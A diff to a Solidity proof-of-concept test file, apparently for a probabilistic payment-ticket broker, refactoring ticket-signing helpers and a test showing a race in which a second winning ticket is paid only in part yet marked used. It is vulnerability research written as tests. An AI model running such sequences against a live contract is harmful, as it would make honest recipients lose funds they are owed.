@@ -67,7 +67,7 @@ contract TicketBrokerDustDepositGriefingPoC is GovernorBaseTest {
         TICKET_BROKER.redeemWinningTicket(ticket, sig, rand);
 
         // Consequence 2: The ticket is marked as used
-        assertTrue(TICKET_BROKER.usedTickets(_getTicketHash(ticket)));
+        assertTrue(TICKET_BROKER.usedTickets(TICKET_BROKER.getTicketHash(ticket)));
 
         // Sanity-check: The deposit is consumed
         (info, ) = TICKET_BROKER.getSenderInfo(sender);
@@ -75,7 +75,7 @@ contract TicketBrokerDustDepositGriefingPoC is GovernorBaseTest {
     }
 
     function testRaceConditionPartialPayout() public {
-        address transcoder2 = BONDING_MANAGER.getNextTranscoderInPool(victimTranscoder);
+        address anotherTranscoder = BONDING_MANAGER.getNextTranscoderInPool(victimTranscoder);
 
         uint256 faceValue = 1 ether;
 
@@ -87,37 +87,35 @@ contract TicketBrokerDustDepositGriefingPoC is GovernorBaseTest {
         assertEq(info.deposit, faceValue + faceValue / 2);
 
         // Two valid winning tickets from the same sender to two different transcoders
-        (MTicketBrokerCore.Ticket memory ticket1, bytes memory sig1, uint256 rand1) = _createSignedTicketWithNonce(
+        (MTicketBrokerCore.Ticket memory ticket1, bytes memory sig1, uint256 rand1) = _createSignedTicket(
+            anotherTranscoder,
+            sender,
+            faceValue
+        );
+        (MTicketBrokerCore.Ticket memory ticket2, bytes memory sig2, uint256 rand2) = _createSignedTicket(
             victimTranscoder,
             sender,
-            faceValue,
-            0
-        );
-        (MTicketBrokerCore.Ticket memory ticket2, bytes memory sig2, uint256 rand2) = _createSignedTicketWithNonce(
-            transcoder2,
-            sender,
-            faceValue,
-            1
+            faceValue
         );
 
-        // Transcoder 1 redeems first and receives full face value
+        // Another transcoder redeems first and receives full face value
         CHEATS.expectEmit(true, true, true, true);
-        emit WinningTicketTransfer(sender, victimTranscoder, faceValue);
-        CHEATS.prank(victimTranscoder);
+        emit WinningTicketTransfer(sender, anotherTranscoder, faceValue);
+        CHEATS.prank(anotherTranscoder);
         TICKET_BROKER.redeemWinningTicket(ticket1, sig1, rand1);
 
-        // Deposit is now 0.5 ETH, not enough to cover the second ticket in full
+        // Deposit is now 0.5 ETH, not enough to cover the victim's ticket in full
         (info, ) = TICKET_BROKER.getSenderInfo(sender);
         assertEq(info.deposit, faceValue / 2);
 
-        // Transcoder 2 redeems second ticket and receives only 0.5 ETH despite a valid 1 ETH ticket
+        // Victim transcoder redeems second and receives only 0.5 ETH despite a valid 1 ETH ticket
         CHEATS.expectEmit(true, true, true, true);
-        emit WinningTicketTransfer(sender, transcoder2, faceValue / 2);
-        CHEATS.prank(transcoder2);
+        emit WinningTicketTransfer(sender, victimTranscoder, faceValue / 2);
+        CHEATS.prank(victimTranscoder);
         TICKET_BROKER.redeemWinningTicket(ticket2, sig2, rand2);
 
-        // Ticket 2 is permanently burned despite the partial payout
-        assertTrue(TICKET_BROKER.usedTickets(_getTicketHash(ticket2)));
+        // Ticket is permanently burned despite the partial payout
+        assertTrue(TICKET_BROKER.usedTickets(TICKET_BROKER.getTicketHash(ticket2)));
         (info, ) = TICKET_BROKER.getSenderInfo(sender);
         assertEq(info.deposit, 0);
     }
@@ -148,59 +146,10 @@ contract TicketBrokerDustDepositGriefingPoC is GovernorBaseTest {
             auxData: abi.encodePacked(creationRound, blockHash)
         });
 
-        bytes32 ticketHash = _getTicketHash(ticket);
+        bytes32 ticketHash = TICKET_BROKER.getTicketHash(ticket);
         bytes32 ethSignedHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", ticketHash));
         (uint8 v, bytes32 r, bytes32 s) = CHEATS.sign(senderPrivateKey, ethSignedHash);
 
         return (ticket, abi.encodePacked(r, s, v), recipientRand);
-    }
-
-    function _createSignedTicketWithNonce(
-        address _recipient,
-        address _sender,
-        uint256 _faceValue,
-        uint256 _nonce
-    )
-        internal
-        returns (
-            MTicketBrokerCore.Ticket memory,
-            bytes memory,
-            uint256
-        )
-    {
-        uint256 recipientRand = 987654321;
-        uint256 creationRound = ROUNDS_MANAGER.currentRound();
-        bytes32 blockHash = ROUNDS_MANAGER.blockHashForRound(creationRound);
-
-        MTicketBrokerCore.Ticket memory ticket = MTicketBrokerCore.Ticket({
-            recipient: _recipient,
-            sender: _sender,
-            faceValue: _faceValue,
-            winProb: type(uint256).max,
-            senderNonce: _nonce,
-            recipientRandHash: keccak256(abi.encodePacked(recipientRand)),
-            auxData: abi.encodePacked(creationRound, blockHash)
-        });
-
-        bytes32 ticketHash = _getTicketHash(ticket);
-        bytes32 ethSignedHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", ticketHash));
-        (uint8 v, bytes32 r, bytes32 s) = CHEATS.sign(senderPrivateKey, ethSignedHash);
-
-        return (ticket, abi.encodePacked(r, s, v), recipientRand);
-    }
-
-    function _getTicketHash(MTicketBrokerCore.Ticket memory t) internal pure returns (bytes32) {
-        return
-            keccak256(
-                abi.encodePacked(
-                    t.recipient,
-                    t.sender,
-                    t.faceValue,
-                    t.winProb,
-                    t.senderNonce,
-                    t.recipientRandHash,
-                    t.auxData
-                )
-            );
     }
 }
